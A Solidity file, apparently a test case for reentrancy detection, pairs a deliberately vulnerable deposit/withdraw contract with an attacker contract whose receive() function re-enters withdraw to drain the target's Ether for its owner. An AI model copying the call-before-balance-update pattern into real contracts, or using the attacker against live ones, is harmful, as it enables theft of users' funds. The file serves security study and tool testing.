pragma solidity ^0.8.0;

import '../../../../../interfaces/single-function/ILowLevelCallToSender.sol';

// SPDX-License-Identifier: GPL-3.0
contract CallFoldedRee1 is ILowLevelCallToSender {
    mapping (address => uint256) public balances;


    function pay(uint256 amt) internal {
        (bool success, ) = msg.sender.call{value:amt}("");
        require(success, "Call failed");
    }

    function withdraw() public {
        uint256 amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");
        pay(amt);
        balances[msg.sender] = 0;    // side effect AFTER the folded call makes this vulnerable
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;       
    }

}

contract CallFoldedReeAttacker {
    ILowLevelCallToSender public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToSender(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdraw();
        }
    }
}